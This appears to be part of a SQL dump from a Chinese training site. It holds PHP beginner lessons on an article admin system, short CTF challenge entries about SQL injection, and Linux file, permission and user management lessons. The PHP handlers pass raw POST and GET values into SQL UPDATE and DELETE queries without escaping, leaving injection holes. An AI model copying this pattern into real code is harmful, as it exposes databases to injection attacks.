class=\"hljs-string\">\"&lt;?php echo $data[\'id\']?&gt;\"</span>&gt;\r\n\r\n        填写文章名：&lt;input type=<span class=\"hljs-string\">\"text\"</span> name=<span class=\"hljs-string\">\"title\"</span> id=<span class=\"hljs-string\">\"title\"</span> value=<span class=\"hljs-string\">\"&lt;?php echo $data[\'title\']?&gt;\"</span>&gt; &lt;br /&gt;\r\n\r\n        填写作者名：&lt;input type=<span class=\"hljs-string\">\"text\"</span> name=<span class=\"hljs-string\">\"author\"</span> id=<span class=\"hljs-string\">\"author\"</span> value=<span class=\"hljs-string\">\"&lt;?php echo $data[\'author\']?&gt;\"</span>&gt; &lt;br /&gt;\r\n\r\n        填写文章简介：&lt;input type=<span class=\"hljs-string\">\"text\"</span> name=<span class=\"hljs-string\">\"description\"</span> id=<span class=\"hljs-string\">\"description\"</span> value=<span class=\"hljs-string\">\"&lt;?php echo $data[\'description\']?&gt;\"</span>&gt; &lt;br /&gt;\r\n\r\n        填写文章内容：&lt;textarea name=<span class=\"hljs-string\">\"content\"</span> id=<span class=\"hljs-string\">\"content\"</span> cols=<span class=\"hljs-string\">\"30\"</span> rows=<span class=\"hljs-string\">\"10\"</span>&gt;<span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">echo</span> $data[<span class=\"hljs-string\">\'content\'</span>]<span class=\"hljs-meta\">?&gt;</span>&lt;/textarea&gt; &lt;br /&gt;\r\n\r\n        &lt;!--填写文章添加时间：&lt;input type=<span class=\"hljs-string\">\"text\"</span> name=<span class=\"hljs-string\">\"dateline\"</span> id=<span class=\"hljs-string\">\"dateline\"</span> value=<span class=\"hljs-string\">\"\"</span>&gt; &lt;br /&gt;--&gt;\r\n\r\n        &lt;input type=<span class=\"hljs-string\">\"submit\"</span> value=<span class=\"hljs-string\">\"提交\"</span>&gt;\r\n\r\n \r\n\r\n    &lt;/form&gt;\r\n\r\n \r\n\r\n&lt;/div&gt;\r\n\r\n&lt;/body&gt;\r\n\r\n&lt;/html&gt;</code></pre><p>上面的php代码前面已经全部讲解过，学员这时候应该能看的明白。这个页面的主要功能其实就是一个界面展示也，主要是html部分的代码。这节课我们讲解一下html代码和php代码的交互。</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image013.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p107.png\"></p><p>上图中17—37行代码都是html代码，里面嵌入了html代码。我们讲解一下html代码和php代码的交互。其中能够交互的主要是form表单，html的form表单可以和任何web语言交互，jsp php python等等。</p><p>25行 中主要元素为 method表示提交方式，分为get和post方式。这里用的post提交。Action主要表示 提交到的页面。如果不写怎表示提交到本页面。上面的代码表示提交到 article.modify.handle.php页面。</p><p>26行中$data[‘id’]表示取数据data中id 的值。然后将这个值复制给value。其中input标签中的 name元素很关键。Name的名称就是$_POST需要接受的参数。比如上面的代码中name的值分别为：id,title,author,description,以及textarea标签的name元素的值content。我们在article.modify.handle.php页面就可以看到将使用相对应的如图所示的方式接收各类标签中的value元素的值<img src=\"http://oda8mr8yr.bkt.clouddn.com/p108.png\">。&nbsp;<img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image014.png\"></p><p>上面就是html和php代码的交互。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//admin/article.modify.handle.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\nob_start();\r\n\r\nsession_start();\r\n\r\n<span class=\"hljs-keyword\">if</span>($_SESSION[<span class=\"hljs-string\">\'username\'</span>]==<span class=\"hljs-keyword\">null</span>){\r\n\r\n<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"login error!\"</span>;\r\n\r\nheader(<span class=\"hljs-string\">\"Location: login.php\"</span>);\r\n\r\n}\r\n\r\n<span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">\'../connect.php\'</span>);\r\n\r\n \r\n\r\n$title = $_POST[<span class=\"hljs-string\">\'title\'</span>];\r\n\r\n$author = $_POST[<span class=\"hljs-string\">\'author\'</span>];\r\n\r\n$description = $_POST[<span class=\"hljs-string\">\'description\'</span>];\r\n\r\n$content = $_POST[<span class=\"hljs-string\">\'content\'</span>];\r\n\r\n$id=$_POST[<span class=\"hljs-string\">\'id\'</span>];\r\n\r\n$dateline = time();\r\n\r\n \r\n\r\n$query=mysql_query(<span class=\"hljs-string\">\"update article set title=\'$title\',author=\'$author\',description=\'$description\',content=\'$content\',dateline=\'$dateline\' where id=\'{$id}\'\"</span>);\r\n\r\n \r\n\r\n<span class=\"hljs-keyword\">if</span>($query){\r\n\r\n \r\n\r\n    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;script&gt;alert(\'修改成功\');window.location.href=\'article.manage.php\'&lt;/script&gt;\"</span>;\r\n\r\n \r\n\r\n}<span class=\"hljs-keyword\">else</span>{\r\n\r\n \r\n\r\n    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;script&gt;alert(\'修改失败\');window.location.href=\'article.manage.php\'&lt;/script&gt;\"</span>;\r\n\r\n \r\n\r\n}</code></pre><p>上面的代码不再讲解，因为前面已经说过了。其中需要说明的是&lt;script&gt;&lt;/script&gt;标签代表的是js的代码。相关内容大家可以看js的基础课程。</p><p>2）注意</p><p></p><p>上面我们通过图示的方式告诉怎么进入线上编程环境。需要注意的是，每次重新部署以后所有环境都会重置，所以希望学员在学习的时候吧编写好的代码，存在本地。</p><p><br></p>',1,'<p>10</p>'),(59,'php基础课程十一','php基础编程，通过一个简单的php系统，来说明php语言的用法以及各种基础知识。','<h2><span style=\"font-size: 14px;\">1）我们接着前面的内容继续。文件结构如下图</span><br></h2><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/p111.png\"><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:157.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"></v:imagedata></v:shape></v:shapetype></p><p>这节课我们来看 article.del.handle.php代码.</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:189pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p112.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>大家多增加几个文章然后点击删除看看是否能删除成功。</p><p><br></p>',4,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB3.jpg','daocloud.io/catteam/phpcodiad:master-ce6f50c','2016-10-10 14:46:13',1,NULL,'<h2><span style=\"font-size: 14px;\">1）源码分析</span><br></h2><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//admin/article.del.handle.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\nob_start();\r\n\r\nsession_start();\r\n\r\n<span class=\"hljs-keyword\">if</span>($_SESSION[<span class=\"hljs-string\">\'username\'</span>]==<span class=\"hljs-keyword\">null</span>){\r\n\r\n<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"login error!\"</span>;\r\n\r\nheader(<span class=\"hljs-string\">\"Location: login.php\"</span>);\r\n\r\n}\r\n\r\n<span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">\'../connect.php\'</span>);\r\n\r\n$id=$_GET[<span class=\"hljs-string\">\'id\'</span>];\r\n\r\n$query = mysql_query(<span class=\"hljs-string\">\"delete from article where id=\'$id\'\"</span>);\r\n\r\n<span class=\"hljs-keyword\">if</span>($query){\r\n\r\n \r\n\r\n    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;script&gt;alert(\'删除成功\');window.location.href=\'article.manage.php\'&lt;/script&gt;\"</span>;\r\n\r\n \r\n\r\n}<span class=\"hljs-keyword\">else</span>{\r\n\r\n \r\n\r\n    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;script&gt;alert(\'删除失败\');window.location.href=\'article.manage.php\'&lt;/script&gt;\"</span>;\r\n\r\n \r\n\r\n}</code></pre><p>上面的php代码前面已经全部讲解过，学员这时候应该能看的明白。有什么不明白的可以搜索google或者咨询团队成员。</p><p>到此为止这个简单系统的基本功能基本上讲解完了，最后我们再讲解一下退出功能。见下节课。</p><p>2）注意</p><p>上面我们通过图示的方式告诉怎么进入线上编程环境。需要注意的是，每次重新部署以后所有环境都会重置，所以希望学员在学习的时候吧编写好的代码，存在本地。</p><p><br></p>',1,'<p>11</p>'),(60,'php基础课程十二','php基础编程，通过一个简单的php系统，来说明php语言的用法以及各种基础知识。','<h2><span style=\"font-size: 14px;\">1）我们接着前面的内容继续。文件结构如下图</span><br></h2><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:181.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p121.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>这节课我们来看 logout.php代码.</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:222pt;height:97.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p122.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>Logout.php中的代码很简单。但是功能很重要。</p><p><br></p>',4,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB3.jpg','daocloud.io/catteam/phpcodiad:master-ce6f50c','2016-10-10 14:49:02',1,NULL,'<h2><span style=\"font-size: 14px;\">1）源码分析</span><br></h2><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//admin/logout.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\nob_start();\r\n\r\nsession_start();\r\n\r\nsession_destroy();\r\n\r\nheader( <span class=\"hljs-string\">\"Location: login.php\"</span> );\r\n\r\n<span class=\"hljs-meta\">?&gt;</span></code></pre><p>我们首先通过系统点击logout.php退出，然后登陆等等一些列的功能我们发现都是好使的。</p><p>接着我们在/admin/index.php中吧前两行注释掉，如图所示</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image004.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p123.png\"></p><p>然后我们再点击登陆试一试。发现登陆不进去了。这个就是session_start（）的功能。Logout.php中的session_destroy()就是退出的时候将session销毁。</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p124.png\"></p><p>然后我们注释掉logout.php中的session_destroy()函数看看。</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image007.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p125.png\"></p><p>点击退出</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image009.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p126.png\"></p><p>此时我们在同一个浏览器中在访问admin/index.php页面发现还是能访问到。说明session并没有销毁还是存在的所以退出功能相当于是失败的。</p><p>至此我们php基础课程全部讲解完毕。</p><p>2）注意</p><p></p><p>上面我们通过图示的方式告诉怎么进入线上编程环境。需要注意的是，每次重新部署以后所有环境都会重置，所以希望学员在学习的时候吧编写好的代码，存在本地。</p><p><br></p>',1,'<p>12</p>'),(61,'CTF基础训练课程一','关于SQL注入和MD5算法的挑战','<p>md5算法的简单练习+sql注入</p><p><br></p>',5,'http://oda8mr8yr.bkt.clouddn.com/CTF.png','daocloud.io/catteam/ctf2:latest','2016-10-11 12:22:33',1,NULL,'<p>1</p>',1,'<p>1</p>'),(62,'CTF基础训练课程二','这是一个关于SQL注入加栅栏密码算法的CTF','<p>找备份文件，构造注入，得到密码，然后栅栏密码解密</p><p><br></p>',5,'http://oda8mr8yr.bkt.clouddn.com/CTF.png','daocloud.io/catteam/ctf1:latest','2016-10-11 12:29:39',1,NULL,'<p>1</p>',1,'<p>1</p>'),(63,'linux基础课程训练二','linux文件管理，用户管理方面的训练','<dt>说明：我虚拟环境使用的是ubuntu14.4.04,可以通过 cat /etc/issue来查看，对于ubuntu系统在做操作之前先更新一下系统使用命令apt-get update命令。如果发现测试的命令找不到</dt><dt><br></dt><dt>可以使用apt-get install -y 命令 先插入这个命令再去运行试一试。比如man命令可能运行不了。apt-get install -y man 之后就可以正常使用了。我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的</dt><dt><br></dt><dt>linux系统做操作练习。</dt><dt><br></dt><dt></dt><dt>文件管理</dt><dd>shell对文件进行管理<br><br>======================================================<br><br>/下的目录的作用<br><br>/bin	普通用户使用的命令, /usr/bin&nbsp;<br>/dev 设备文件<br>/home 普通的家目录小区<br>/lost+found 孤儿文件<br>/misc 自动挂载<br>/net&nbsp;<br>/proc 内核虚拟目录，反映出来是内核、进程的实时状态<br>/sbin 超级用户使用的命令, /usr/sbin&nbsp;<br>/srv&nbsp;<br>/tftpboot tftp服务的根目录<br>/usr	系统的安装位置，内核于C盘上的windows目录<br>/boot 和启动相关的文件，kernel grub<br>/etc 配置文件，包括系统配置、各种应用的配置<br>/lib 库文件<br>/media 建议挂载移动存储目录&nbsp;<br>/mnt&nbsp;<br>/opt 系统建议的安装第三方软件，(/usr/local)<br>/root root用户的家目录<br>/selinux&nbsp;<br>/sys 虚拟目录<br>/tmp 临时文件&nbsp;<br>/var 变化的数据，比如日志文件、数据库文件<br><br>=====================================================<br><br>路径<br><br>绝对路径：路径从/开始<br>相对路径：相对于当前目录开始<br><br>. 链接到当前目录<br>..	链接到上一级目录<br><br>=====================================================<br><br>file&nbsp;文件	查看文件类型<br><br>=====================================================<br><br>ls命令<br><br>ls -l install.log<br>-	:rw-r--r--:1	: root :root :38784 :09-25 14:26 :install.log<br>文件类型	:权限位	:硬链接数 : 拥有者 :所属组 :大小 :最后一次修改时间 :文件名<br><br>- 普通文件<br>d 目录文件<br>l 链接文件<br>b 块设备文件<br>p 管道文件<br>s 套节字文件<br>c 字符文件<br><br>-d 查看目录的信息 -a 显示隐藏文件 -A 显示所有文件除了.和.. -t按时间排序 -r反向排序<br>-h 按最大单位显示 -R 递归显示<br><br>=========================================================<br><br>cd命令<br><br>cd 作用，切换目录<br>cd 绝对路径，比如:cd /home/alice cd /etc/sysconfig/network-scripts/<br>cd 相对路径，比如：cd 目录，cd ..<br>cd -	返回<br>cd ~	(~表示的是当前用户的HOME目录)，cd ~alice<br>cd	直接回家<br><br>==========================================================<br><br>文件管理之：创建/复制/移动/删除<br><br>创建<br>touch filename<br>文件的时间戳：使用ls长模式看到时间戳只是修改时间<br>stat anaconda-ks.cfg<br>访问时间 Access: atime	文件最后被访问的时间<br>修改时间 Modify: mtime	文件最后被修改的时间（文件的内容）<br>改变时间 Change: ctime	文件属性被改变（文件的权限、链接）<br><br>mkdir dirname<br>mkdir /home/{dir3,dir4} ＝ mkdir /home/dir3 /home/dir4<br><br><br>复制<br>cp 源 目标<br>cp notecase-1.9.8-1.fc6.i386.rpm /home/dir2/<br>cp -rf dir1 /home/dir2<br><br>移动<br>mv 源 目标<br><br>删除<br>rm -rf 文件<br>rm -rf /home/dir2<br><br>=============================================================<br><br>查看文件的内容：（文本文件）<br><br>cat more less head tail<br>cat /etc/hosts<br>cat -n /etc/grub.conf<br>cat /etc/sysconfig/network-scripts/ifcfg-eth0<br>cat /etc/sysconfig/network<br>cat /etc/resolv.conf<br><br>============================================================<br><br>分页查看文件的内容<br><br>more /etc/passwd<br>less /etc/passwd	可以上下翻页，搜索文本<br><br>head /etc/passwd	默认看文件的前10行<br>head -2 /etc/passwd	看文件的前两行<br><br>tail /etc/passwd<br>tail -2 /etc/passwd<br>tail -f /var/log/messages	动态查看文件的内容<br><br>===========================================================<br><br>查看二进制文件 strings<br><br>strings /bin/ls<br><br>===========================================================<br><br>过滤文件：grep<br><br>grep \'root\' /etc/passwd<br>grep --color \'root\' /etc/passwd<br>grep --color \'^root\' /etc/passwd 以root开头的行<br>grep --color \'/bin/bash$\' /etc/passwd 以/bin/bash结尾的行<br><br><br><br><br></dd><dt>文件及目录权限</dt><dd>文件及目录权限 UGO<br><br>ll install.log<br>-rw-r--r-- 1 robin uplooking 38784 09-26 16:17 install.log<br><br>rw-	｜ r--	｜ r--<br>user(u)	group(g)	other(o)	<br>rwx	｜rwx	｜ rwx<br>===================================<br><br>权限对象<br>属主	u<br>属组	g<br>其他人	o<br>所有人	a<br><br>==================================<br><br>权限类型<br>读	r	4<br>写	w	2<br>执行	x	1<br><br>==================================<br><br>对于文件<br>r--------cat more less....<br>w--------vim gedit<br>x--------./&nbsp;<br><br>对于目录<br>r--------ls r-x详细信息<br>w--------touch mkdir rm -wx才可以删除<br>x--------cd<br><br>==================================<br><br>更改文件的属主或属组<br><br>chgrp hr /home/hr<br>chown alice.hr /home/hr/<br>chown alice /home/hr/<br>chown .hr /home/hr/<br><br>注：用户alice，组hr事先存在<br><br>==================================<br><br>对文件设置权限：<br><br>一、使用字符<br>chmod o-rx /home/hr/<br>chmod g+w /home/hr/<br>chmod o=rx /home/hr/<br>chmod u=rwx,g=rx,o=- /home/hr/<br>chmod ug=rwx,o=- /home/hr<br>chmod a+x /home/hr/<br><br>二、使用数字<br>chmod 644 /home/hr/<br>chmod 755 /home/hr/<br>chmod 777 /home/hr/<br><br>===================================<br><br>查以下文件权限<br>/	rwxr-xr-x	755<br>/etc	rwxr-xr-x	755<br>/var	rwxr-xr-x	755	<br>/tmp	rwxrwxrwt	1777<br>/usr	rwxr-xr-x	755	<br>/etc/passwd	rw-r--r--	644<br>/etc/shadow	r--------	400<br>/root	rwxr-x---	750&nbsp;<br>/home/zorro	rwx------	700<br><br>==================================<br><br>root用户创建文件的默认权限	rw-r--r--	644<br>root用户创建目录的默认权限	rwxr-xr-x	755<br>普通用户创建文件的默认权限	rw-rw-r--	664<br>普通用户创建目录的默认权限	rwxrwxr-x	775<br><br><br><span style=\"font-weight: 700;\">用户管理</span><br></dd><dd>用户管理：<br><br>=============================================<br><br>uid的范围	用户身份	gid	属组<br>0	root	0 root<br>1-499 系统用户	1-499 系统组<br>500-60000 普通用户	500-60000 普通用户组<br><br>==============================================<br><br>修改用户信息<br><br>usermod -u -g -c -d -s -G 用户<br>usermod -l 新名字 老名字<br>usermod -L 用户名<br>usermod -U　用户名<br>usermod -f 密码过期后帐号过期时间<br><br>==============================================<br><br>修改组信息<br><br>usermod -a -G [附加组] 用户名<br>groupmod -g gid 组名<br>groupmod -n 新组名 老组名<br><br>===============================================<br><br>修改密码信息<br><br>passwd 用户名<br>passwd -n -x -w -i 用户名<br>passwd -l 用户名<br>qpasswd -u 用户名<br>passwd -S 用户名 查询密码状态<br><br>===============================================<br><br>/etc/passwd	保存的用户的基本信息<br><br>root:x:0:0:root:/root:/bin/bash<br>用户名:密码:uid:gid:描述:HOME:shell<br><br>例：<br>useradd eric<br>useradd -u 1000 abc1<br>useradd -u 1001 -g 1000 abc2&nbsp;<br>useradd -u 1002 -g 1000 -c nothing abc2&nbsp;<br>useradd -u 1002 -g 1000 -c nothing abc3<br>useradd -u 1003 -g 1000 -c nothing -d /mnt/abc4 abc4<br>useradd -u 1004 -g 1000 -c nothing -d /home/abc5 -s /bin/ksh abc5<br><br>=================================================<br><br>/etc/shadow	保存的用户的密码及密码策略<br><br>eric:$1$RChwKalp$QIQMEexZz6bsZxChBVpje1:15610:0:99999:7:::<br>第一列 用户名<br>第二列 密码<br>第三列 最后一次修改密码的时间(天)(从1970.1.1开始到当天的天数)<br>第四列 密码最小时间 -n<br>第五列 密码最大时间 -x<br>第六列 密码过期前警告时间 -w<br>第七列 密码过期后帐号过期时间 -i<br>第八列 帐号过期时间<br>第九列 保留列<br><br>==================================================<br><br>/etc/group	保存组信息<br><br>uplooking:x:1001:<br>组名:组密码占位符:gid:用户名<br><br>[root@station230 ~]# id user2<br>uid=503(user2) gid=503(user2) groups=503(user2)<br><br>[root@station230 ~]# gpasswd -a user2 hr<br>正在将用户“user2”加入到“hr”组中<br><br>[root@station230 ~]# useradd user3 -G hr<br><br>=================================================<br><br>useradd添加用户时的参考文件<br><br>/etc/login.defs&nbsp;<br>/etc/default/useradd<br>ls -a /etc/skel/<br><br>=================================================<br><br>用户的手动管理<br><br>命令添加：<br>groupadd uplooking<br><br>手动添加：<br>vim /etc/group<br>uplooking:x:3000:<br><br>==================<br><br>命令添加：<br>useradd zorro<br><br>手动添加：<br>vim /etc/passwd<br><br>zorro:x:3000:3000:PT user:/home/zorro:/bin/bash<br><br>mkdir /home/zorro<br>cp /etc/skel/.bash* /home/zorro<br><br>==================<br><br>命令添加：<br>passwd zorro<br><br>手动添加：<br>grub-md5-crypt<br>vim /etc/shadow<br><br>zorro:$1$lvVUs0$fWv/FtFugyqigyU8K3ZzF0:15610:0:99999:7:::<br><br>===================<br><br>修改家目录属主和属组<br><br>chown zorro.zorro /home/zorro<br><br>====================================================<br><br>多用户导入<br><br>touch user.txt<br>vim user.txt<br><br>aaa:x:4000:4000:aaa:/home/aaa:/bin/bash<br>bbb:x:5000:5000:bbb:/home/bbb:/bin/bash<br><br>文件内用户名 uid 不能和系统中/etc/passwd文件冲突<br>newusers &lt;　user.txt<br><br>id　aaa<br>id　bbb<br><br>touch passwd.txt<br>vim passwd.txt<br>aaa:123<br>bbb:123<br><br>chpasswd &lt; passwd.txt<br><br>=====================================================<br></dd><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/ubuntu14.04.jpeg','index.alauda.cn/library/ubuntu:14.04.4','2016-10-13 10:47:13',1,NULL,'',0,''),(64,'linux基础课程训练三','关于文件权限方面的基础训练','<dt>说明：我虚拟环境使用的是ubuntu14.4.04,可以通过 cat /etc/issue来查看，对于ubuntu系统在做操作之前先更新一下系统使用命令apt-get update命令。如果发现测试的命令找不到</dt><dt><br></dt><dt>可以使用apt-get install -y 命令 先插入这个命令再去运行试一试。比如man命令可能运行不了。apt-get install -y man 之后就可以正常使用了。</dt><dt><br></dt><dt>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</dt><dt><br></dt><dt>UGO权限方案</dt><dd>权限方案：UGO<br>权限掩码：umask<br><br>=====================================<br><br>默认情况下管理员的 umask 0022，普通用户的 umask 0002<br>以文件默认权限是 666，umask 是 033，得到一个文件的权限<br><br>1).666 的权限是 rw- rw- rw-，换算成 2 进制 110 110 110<br>2).umask033 权限是 --- -wx -wx ，换算成 2 进制 000 011 011<br>3).umask 2 进制取反 000 011 011 --------&gt;111 100 100<br>4).umask 取反后的 2 进制和默认权限做与运算<br><br>umask	111 100 100<br>默认权限	110 110 110<br>--------------------------------------<br>110 100 100<br>rw- r-- r--<br><br>5).得到最终的权限 644<br><br>======================================<br><br>root用户：<br>[root@station230 ~]#&nbsp;umask&nbsp;<br>0022<br>[root@station230 ~]#&nbsp;umask -S<br>u=rwx,g=rx,o=rx<br>[root@station230 ~]#&nbsp;mkdir dir20<br>[root@station230 ~]#&nbsp;touch file20<br>[root@station230 ~]#&nbsp;ll -d dir20 file20&nbsp;<br>drwxr-xr-x 2 root root 4096 09-06 13:20 dir20<br>-rw-r--r-- 1 root root 0 09-06 13:20 file20<br><br>普通用户：<br>[root@station230 ~]#&nbsp;su - yang02<br>[yang02@station230 ~]$&nbsp;umask&nbsp;<br>0002<br>[yang02@station230 ~]$&nbsp;umask -S<br>u=rwx,g=rwx,o=rx<br>[yang02@station230 ~]$&nbsp;mkdir dir30<br>[yang02@station230 ~]$&nbsp;touch dir30.txt<br>[yang02@station230 ~]$&nbsp;ll -d dir30 dir30.txt&nbsp;<br>drwxrwxr-x 2 yang02 yang02 4096 09-06 13:26 dir30<br>-rw-rw-r-- 1 yang02 yang02 0 09-06 13:26 dir30.txt<br><br># (umask 077; touch file3000)<br></dd><dt>隐藏属性</dt><dd>文件隐藏属性：a i<br><br>chattr,lsattr<br><br>=====================================================<br><br>a 拥有a属性的文件 任何用户不能删除,移动,重命名,修改内容,覆盖,该文件 可以追加内容<br>拥有a属性的目录 任何用户不能删除,移动,重命名该目录下的文件 可以创建文件<br><br>[root@station230 ~]#&nbsp;chattr +a test.txt<br>[root@station230 ~]#&nbsp;echo \"3333\" &gt;&gt; test.txt<br>[root@station230 ~]#&nbsp;cat test.txt&nbsp;<br>1111<br>2222<br>3333<br>[root@station230 ~]#&nbsp;rm -rf test.txt&nbsp;<br>rm: 无法删除 “test.txt”: 不允许的操作<br><br>======================================================<br><br>i 拥有i属性的文件 任何用户不能删除,移动,重命名,修改内容,覆盖,追加,该文件<br>拥有i属性的目录 任何用户不能删除,移动,重命名该目录下的文件<br><br>[root@station230 ~]#&nbsp;chattr +i /etc/resolv.conf<br>[root@station230 ~]#&nbsp;lsattr /etc/resolv.conf<br>----i-------- /etc/resolv.conf<br>[root@station230 ~]#&nbsp;echo \"sss\" &gt;&gt; /etc/resolv.conf<br>bash: /etc/resolv.conf: 权限不够<br>[root@station230 ~]#&nbsp;rm -rf /etc/resolv.conf<br>rm: 无法删除 “/etc/resolv.conf”: 不允许的操作<br><br><br></dd><dt>特殊权限</dt><dd>特殊权限：<br><br>对象：可执行文件 SUID SGID<br>执行可执行文件的时候，不以执行者的身份去运行，而是以文件所属人（组）的身份去执行<br><br>对象：目录 SGID Sticky<br>SGID	当一个A目录具有 SGID的时候，在这个目录下新建的文件文件夹默认所属组会是A目录的所属组<br>Sticky	当 A目录具有 Sticky 位的时候，在 A目录下的文件只有文件的所属人才能够删除文件，其他人哪怕对A目录有写的权限也不能删。<br><br>======================================================================================================<br><br>SUID<br><br>[root@mail ~]#&nbsp;ll /usr/bin/passwd&nbsp;<br>-rwsr-xr-x 1 root root 23420 2010-08-03 /usr/bin/passwd<br>[root@mail ~]#&nbsp;ll /etc/shadow<br>-r-------- 1 root root 1150 12-23 10:59 /etc/shadow<br><br>passwd命令实际上是将内容写入/etc/shadow文件，但实际上普通用户执行passwd时对/etc/shadow并没有<br>权限，由于passwd可执行文件有suid权限，会调用命令执行对象/etc/shadow所有者的权限来执行命令，使<br>得普通用户也可以修改密码。<br><br>=======================================================================================================<br><br>SGID<br><br>[root@station230 ~]#&nbsp;chmod g+s /home/yyy/&nbsp;<br>[root@station230 ~]#&nbsp;ll -d /home/yyy/<br>drwxr-sr-x 2 root hr 4096 09-06 14:08 /home/yyy/<br>[root@station230 ~]#&nbsp;touch /home/yyy/file2<br>[root@station230 ~]#&nbsp;ll /home/yyy/<br>总计 0<br>-rw-r--r-- 1 root root 0 09-06 14:08 file1<br>-rw-r--r-- 1 root hr 0 09-06 14:10 file2<br><br>========================================================================================================<br><br>Sticky<br><br>问题：只要用户对某个目录有w权限，则意味着他可以对该目录下的任何文件进行删除<br>...他可以删除自己创建的文件<br>...也可以删除其他人创建的文件<br><br>[yang02@station230 ~]$&nbsp;id<br>uid=10000(yang02) gid=5014(yang02) groups=5014(yang02)<br>[yang02@station230 ~]$&nbsp;ll -d /home/yyy/<br>drwxrwxrwx 2 root hr 4096 09-06 14:10 /home/yyy/<br>[yang02@station230 ~]$&nbsp;cd /home/yyy/<br>[yang02@station230 yyy]$&nbsp;ll<br>总计 0<br>-rw-r--r-- 1 root root 0 09-06 14:08 file1<br>-rw-r--r-- 1 root hr 0 09-06 14:10 file2<br>[yang02@station230 yyy]$&nbsp;rm -rf *<br>[yang02@station230 yyy]$&nbsp;ls<br><br>解决方法：<br>[root@station230 ~]#&nbsp;chmod o+t /home/yyy/&nbsp;<br>[root@station230 ~]#&nbsp;ll -d 